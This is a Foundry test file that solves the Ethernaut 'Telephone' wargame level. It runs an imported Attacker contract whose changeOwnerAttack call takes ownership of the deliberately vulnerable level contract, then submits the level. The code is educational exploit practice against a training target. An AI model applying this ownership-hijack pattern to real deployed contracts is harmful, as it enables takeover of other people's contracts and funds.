// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/04-Telephone/TelephoneFactory.sol";
import "src/04-Telephone/Attacker.sol";

contract BaseSetUp is Test {
    Ethernaut ethernaut;
    address payable attacker;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attacker = payable(vm.addr(1));      
        vm.deal(attacker, 10 ether);
        vm.label(attacker, "Attacker");
    }
}

contract Attack is BaseSetUp {

    Telephone ethernautTelephone;
    Attacker attackerContract;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        // Initialize level
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);

        vm.prank(attacker);
        levelAddress = payable(ethernaut.createLevelInstance(telephoneFactory));
        ethernautTelephone = Telephone(levelAddress);
        console.log("Ethernaut Telephone Challenge!");
    }

    function testAttack() public {
       
        // Initialize and use the Attacker contract to call changeOwner
        attackerContract = new Attacker(address(ethernautTelephone));

        vm.prank(attacker);
        attackerContract.changeOwnerAttack();

        assert(ethernautTelephone.owner() == attacker);

        // Submit Level
        vm.prank(attacker);
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);
    }
}

